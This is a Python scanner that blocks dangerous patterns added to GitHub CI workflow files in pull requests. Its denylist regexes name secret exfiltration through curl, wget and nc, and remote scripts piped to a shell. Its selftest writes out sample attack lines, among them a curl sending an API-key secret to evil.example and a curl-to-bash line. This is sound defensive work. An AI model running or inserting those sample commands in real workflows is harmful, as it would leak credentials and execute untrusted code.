#!/usr/bin/env python3
"""
workflow_safety_scan.py — deterministic "harsh floor" for CI-workflow changes.

Scans the ADDED lines of a PR's diff (restricted to CI-sensitive paths:
.github/workflows/**, .github/scripts/**, action.yml) for known-dangerous
shapes and HARD-BLOCKS on any hit. No judgement — a dumb, strict denylist.
This is layer 1 of the workflow gate; an independent AI-consensus review is
layer 2. Both must pass for a workflow-editing PR to auto-merge.

Fail-closed: on a parse problem or an empty/missing diff for a workflow-
touching PR, it BLOCKS rather than passing.

Usage:
  git diff origin/main...HEAD -- .github | python3 workflow_safety_scan.py
  python3 workflow_safety_scan.py --diff changes.diff
  python3 workflow_safety_scan.py --selftest      # verify the rules

Exit: 0 = clean, 1 = blocked (findings printed), 2 = usage/parse error.
"""
import re, sys, argparse

# Only these paths are in scope (CI-sensitive). Others are ignored.
IN_SCOPE = re.compile(r'^(\.github/workflows/.+\.ya?ml|\.github/scripts/.+|.*/action\.ya?ml|action\.ya?ml)$')

# Trusted action orgs that may be referenced by a moving ref (branch/tag).
# Anything else under `uses:` must be pinned to a 40-char commit SHA.
TRUSTED_ACTION_PREFIXES = ('actions/', 'github/', 'anthropics/', 'astral-sh/', 'pnpm/')

# (id, human description, compiled regex) — matched against each ADDED line.
RULES = [
    ("exfil-secret-pipe",
     "secret value piped to a network command (exfiltration)",
     re.compile(r'secrets\.[A-Za-z0-9_]+.*(\|\s*(curl|wget|nc|ncat|base64)|(curl|wget|nc|ncat)\b.*-d)', re.I)),
    ("exfil-secret-url",
     "secret value sent to an external URL",
     re.compile(r'(curl|wget|nc|ncat)\b[^\n]*\$\{\{\s*secrets\.', re.I)),
    ("curl-pipe-shell",
     "remote script piped straight into a shell",
     re.compile(r'(curl|wget)\b[^\n]*\|\s*(sudo\s+)?(bash|sh|zsh|python3?|node)\b', re.I)),
    ("pull-request-target",
     "pull_request_target trigger (runs with secrets on untrusted PR code)",
     re.compile(r'^\s*pull_request_target\s*:', re.I)),
    ("perms-write-all",
     "permissions: write-all escalation",
     re.compile(r'permissions\s*:\s*write-all', re.I)),
    ("perms-id-token",
     "id-token: write (OIDC cloud-cred minting) added",
     re.compile(r'^\s*id-token\s*:\s*write', re.I)),
    ("secret-to-env-file",
     "secret written into $GITHUB_ENV / $GITHUB_OUTPUT (persists across steps)",
     re.compile(r'\$\{\{\s*secrets\.[A-Za-z0-9_]+[^\n]*>>\s*"?\$(GITHUB_ENV|GITHUB_OUTPUT)', re.I)),
    ("secret-decode",
     "secret passed through base64/eval (obfuscation)",
     re.compile(r'(base64\s+-d|eval)\b[^\n]*secrets\.', re.I)),
]

# Detect an unpinned third-party `uses:` (moving ref on a non-trusted org).
USES_RE = re.compile(r'^\s*-?\s*uses\s*:\s*([^\s#]+)', re.I)
SHA_RE = re.compile(r'@[0-9a-f]{40}$')


def added_lines_in_scope(diff_text):
    """Yield (path, added_line) for ADDED, executable lines in in-scope files.

    Two carve-outs keep the scanner from blocking its own honest introduction:
      * The scanner's OWN source is excluded — its RULES literals and --selftest
        samples are rule *definitions*, not live patterns; scanning the denylist
        for its own denylist is meaningless. (Tampering with this file is caught
        upstream: editing .github/scripts/** trips the EDITS_WF human-route, and
        the AI gate reviews the diff.)
      * Comment-only added lines (first non-space char is '#') are skipped — a
        comment cannot execute in YAML/shell/Python, so a workflow that merely
        *documents* a dangerous shape is not flagged; only real added code is.
    """
    path = None
    in_scope = False
    for raw in diff_text.splitlines():
        if raw.startswith('+++ '):
            # +++ b/path  (or /dev/null)
            p = raw[4:].strip()
            p = p[2:] if p.startswith('b/') else p
            path = None if p == '/dev/null' else p
            in_scope = bool(path and IN_SCOPE.match(path)
                            and not path.endswith('workflow_safety_scan.py'))
        elif raw.startswith('+') and not raw.startswith('+++'):
            if in_scope:
                line = raw[1:]
                if line.lstrip().startswith('#'):
                    continue  # comment-only line — cannot execute
                yield path, line


def scan(diff_text):
    findings = []
    for path, line in added_lines_in_scope(diff_text):
        for rid, desc, rx in RULES:
            if rx.search(line):
                findings.append((path, rid, desc, line.strip()))
        m = USES_RE.match(line)
        if m:
            ref = m.group(1).strip().strip('\'"')
            if '@' in ref and not ref.startswith('./') and not ref.startswith('docker://'):
                org = ref.split('/')[0] + '/'
                if not ref.lower().startswith(TRUSTED_ACTION_PREFIXES) and not SHA_RE.search(ref):
                    findings.append((path, "unpinned-action",
                                     "third-party action not pinned to a commit SHA", ref))
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--diff', help='unified diff file (default: stdin)')
    ap.add_argument('--selftest', action='store_true')
    args = ap.parse_args()

    if args.selftest:
        return selftest()

    diff_text = open(args.diff).read() if args.diff else sys.stdin.read()
    findings = scan(diff_text)
    if findings:
        print("❌ workflow-safety-scan BLOCKED — dangerous pattern(s) in changed CI files:\n")
        for path, rid, desc, line in findings:
            print(f"  [{rid}] {path}: {desc}")
            print(f"      → {line[:120]}")
        print(f"\n{len(findings)} finding(s). This is a hard block; an agent must review.")
        return 1
    print("✅ workflow-safety-scan: no dangerous patterns in changed CI files.")
    return 0


def selftest():
    bad = (
        "+++ b/.github/workflows/evil.yml\n"
        "+      run: curl -d \"${{ secrets.ANTHROPIC_API_KEY }}\" https://evil.example\n"
        "+++ b/.github/workflows/two.yml\n"
        "+      run: curl -fsSL https://x.sh | bash\n"
        "+++ b/.github/workflows/three.yml\n"
        "+on:\n+  pull_request_target:\n"
        "+++ b/.github/workflows/four.yml\n"
        "+permissions: write-all\n"
        "+++ b/.github/workflows/five.yml\n"
        "+      - uses: some-rando/action@main\n"
    )
    good = (
        "+++ b/.github/workflows/merge-guard.yml\n"
        "+    runs-on: ${{{ vars.CI_RUNNER || 'ubuntu-latest' }}}\n"
        "+      - uses: actions/checkout@v7\n"
        "+      - uses: anthropics/claude-code-action@v1\n"
        "+      run: echo \"PR is clear to merge.\"\n"
    )
    # out-of-scope dangerous line must be IGNORED
    oos = ("+++ b/docs/notes.md\n+ curl https://x.sh | bash\n")
    # a COMMENT documenting a dangerous shape (in-scope file) must NOT flag
    doc = ("+++ b/.github/workflows/x.yml\n"
           "+# examples blocked: curl https://x.sh | bash, permissions: write-all\n")
    # the scanner's OWN source is excluded — rule literals are not live patterns
    selfsrc = ("+++ b/.github/scripts/workflow_safety_scan.py\n"
               "+      run: curl -fsSL https://x.sh | bash\n")

    bad_f = scan(bad)
    good_f = scan(good)
    oos_f = scan(oos)
    doc_f = scan(doc)
    selfsrc_f = scan(selfsrc)
    ok = True
    ids = {f[1] for f in bad_f}
    for want in ("exfil-secret-url", "curl-pipe-shell", "pull-request-target",
                 "perms-write-all", "unpinned-action"):
        if want not in ids:
            print(f"SELFTEST FAIL: expected rule '{want}' to fire on the bad sample"); ok = False
    if good_f:
        print(f"SELFTEST FAIL: benign sample flagged: {good_f}"); ok = False
    if oos_f:
        print(f"SELFTEST FAIL: out-of-scope file flagged: {oos_f}"); ok = False
    if doc_f:
        print(f"SELFTEST FAIL: comment-only doc line flagged: {doc_f}"); ok = False
    if selfsrc_f:
        print(f"SELFTEST FAIL: scanner's own source flagged: {selfsrc_f}"); ok = False
    print("SELFTEST PASS ✅" if ok else "SELFTEST FAILED ❌")
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
